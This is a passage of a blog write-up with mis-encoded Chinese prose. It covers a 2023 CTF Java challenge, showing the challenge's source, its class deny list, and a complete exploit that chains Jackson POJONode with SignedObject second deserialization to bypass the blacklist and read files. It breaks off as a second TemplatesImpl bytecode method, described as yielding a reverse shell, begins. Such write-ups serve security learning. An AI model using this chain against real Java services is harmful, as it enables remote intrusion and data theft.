    <link href="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/"/>
    <url>/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æœ¬æ¥æ˜¯æƒ³å­¦ä¹ JacksonåŸç”Ÿé“¾æ‰å¼€å§‹åšè¿™é“é¢˜æ‰“å¤ç°ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°çš„æ˜¯è¿™é“é¢˜çš„ä¸¤ä¸ªåšæ³•è®©æˆ‘å­¦ä¹ åˆ°äº†JacksonåŸç”Ÿé“¾ç»“åˆäºŒæ¬¡ååºåˆ—åŒ–ç»•é»‘åå•æˆ–è€…æ‰“TemplatesImplæ¶æ„å­—èŠ‚ç ã€‚</p><p>å­¦åˆ°å¦‚ä»Šæ›´è§‰å—ç›ŠåŒªæµ…ï¼Œè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å®¡ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211530820.png" alt="image-20240803211530820"></p><p><strong>IndexController.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&#123;&quot;/hack&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String payload)</span> &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8));<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(byteArrayInputStream);<br>            <span class="hljs-type">URLHelper</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (URLHelper)ois.readObject();<br>            System.out.println(o);<br>            System.out.println(o.url);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok!&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/file&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">file</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            file.createNewFile();<br>        &#125;<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        fis.read(bytes);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>URLHelper.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLHelper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String url;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">visiter</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLHelper</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-built_in">this</span>.url = url;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.visiter != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.visiter.visitUrl(<span class="hljs-built_in">this</span>.url);<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/file&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>                file.createNewFile();<br>            &#125;<br><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>            fos.write(result.getBytes());<br>            fos.close();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>URLVisitor.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLVisiter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">URLVisiter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">visitUrl</span><span class="hljs-params">(String myurl)</span> &#123;<br>        <span class="hljs-keyword">if</span> (myurl.startsWith(<span class="hljs-string">&quot;file&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file protocol is not allowed&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(myurl);<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(url.openStream()));<br>                <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>                String inputLine;<br>                <span class="hljs-keyword">while</span>((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    sb.append(inputLine);<br>                &#125;<br><br>                in.close();<br>                <span class="hljs-keyword">return</span> sb.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>                <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var6;<br>                <span class="hljs-keyword">return</span> e.toString();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦æ‰“&#x2F;hackè·¯ç”±ååºåˆ—åŒ–è¿›å»ï¼Œ&#x2F;fileå°±æ˜¯ä¸€ä¸ªè¯»æ–‡ä»¶çš„åŠŸèƒ½ã€‚å†çœ‹ä¸¤ä¸ªURLè‡ªå®šä¹‰æ¨¡æ¿ç±»ï¼Œå®ƒä»¬éƒ½ç»§æ‰¿äº†Serializableæ¥å£ã€‚</p><p>URLHelperé‡å†™äº†readObjectæ–¹æ³•ï¼Œå³ä¸ºå…¥å£ç±»ã€‚è°ƒç”¨äº†ä»»æ„ç±»çš„visitUrlæ–¹æ³•ï¼Œå¹¶æŠŠç»“æœå†™è¿›æ–‡ä»¶é‡Œã€‚</p><p>URLVisiteré€šè¿‡æŒ‡å®šurlè®¿é—®å…¶å†…éƒ¨èµ„æºç„¶åè¿”å›ã€‚</p><p>åªä¸è¿‡æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯&#x2F;hackè·¯ç”±çš„ååºåˆ—åŒ–éƒ¨åˆ†ï¼Œå®ƒä½¿ç”¨çš„æ˜¯è‡ªå®šä¹‰çš„è¾“å…¥æµçš„ç±»<code>MyObjectInputStream</code>ã€‚è¿™ä¸ªç±»é‡å†™äº†<code>resolveClass</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠŠInetAddressã€CCé“¾banäº†ï¼Œç”šè‡³æŠŠä»–è‡ªå·±å†™çš„URLVisitorå’ŒURLHelperç»™banäº†ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¼•å…¥ç¬¬ä¸€ä¸ªåšæ³•ï¼Œåº”è¯¥ä¹Ÿæ˜¯é¢„æœŸè§£ã€‚</p><h3 id="SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•"><a href="#SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•" class="headerlink" title="SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•"></a>SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é»‘åå•</h3><p><code>SignedObject</code>çš„äºŒæ¬¡ååºåˆ—åŒ–èƒ½å¤Ÿè®©æˆ‘ä»¬æ­£å¸¸ä½¿ç”¨åˆ°é¢˜ç›®æä¾›çš„<code>URLHelper</code>å’Œ<code>URLVister</code>ï¼Œç„¶åæ€è·¯ä¹Ÿå¾ˆæ¸…æ™°ï¼Œå°±æ˜¯æ‰“<code>/hack</code>ååºåˆ—åŒ–ï¼Œfileçš„<code>startWith</code>ç»•è¿‡å¯ä»¥åœ¨å‰é¢åŠ ä¸ªç©ºæ ¼ï¼Œæˆ–è€…å…¨å¤§å†™ç»•è¿‡ã€‚ç¬¬ä¸€æ¬¡è¯»å–ç›®å½•å’Œæ–‡ä»¶åæ‰¾flagï¼ˆæ˜¯çš„ï¼Œfile:&#x2F;&#x2F;å¯ä»¥è¯»ç›®å½•ï¼‰ï¼Œç¬¬äºŒæ¬¡è¯»å–flagã€‚<code>/flie</code>è·¯ç”±å¯ä»¥è¯»å–åˆ°å›æ˜¾å†…å®¹ã€‚</p><p>æ‰€ä»¥Expå‘¼ä¹‹æ¬²å‡ºï¼Œç”¨<code>Jackson</code>åŸç”Ÿé“¾å¥—ä¸Š<code>SignedObject</code>æ‰“äºŒæ¬¡ååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.PrivateKey;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot; file:///flag_eddiemurphy&quot;</span>);<br>        <span class="hljs-comment">//URLHelper urlHelper = new URLHelper(&quot; file:///&quot;);</span><br>        <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br>        setFieldValue(urlHelper, <span class="hljs-string">&quot;visiter&quot;</span>, urlVisiter);<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp, jsonNodes);<br>        System.out.println(serial(exp));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211139099.png" alt="image-20240803211139099"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211143135.png" alt="image-20240803211143135"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211146962.png" alt="image-20240803211146962"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211151783.png" alt="image-20240803211151783"></p><p>ç¬¬äºŒä¸ªæ–¹æ³•æ›´ç¥ï¼Œå› ä¸ºç›´æ¥RCEäº†ã€‚</p><h3 id="TemplatesImplæ¶æ„å­—èŠ‚ç "><a href="#TemplatesImplæ¶æ„å­—èŠ‚ç " class="headerlink" title="TemplatesImplæ¶æ„å­—èŠ‚ç "></a>TemplatesImplæ¶æ„å­—èŠ‚ç </h3><p>è¿™ä¸ªæ–¹æ³•ç”šè‡³ä¸éœ€è¦å®ƒçš„URLHelperå’ŒURLVisiterï¼Œç›´æ¥èƒ½åå¼¹shellã€‚</p><p>æ€è·¯æ¥æºæ˜¯AliyunCTF2023çš„Bypassit1ã€‚</p><p>ä¸å–å…³å­äº†ï¼Œç›´æ¥ä¸Šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> 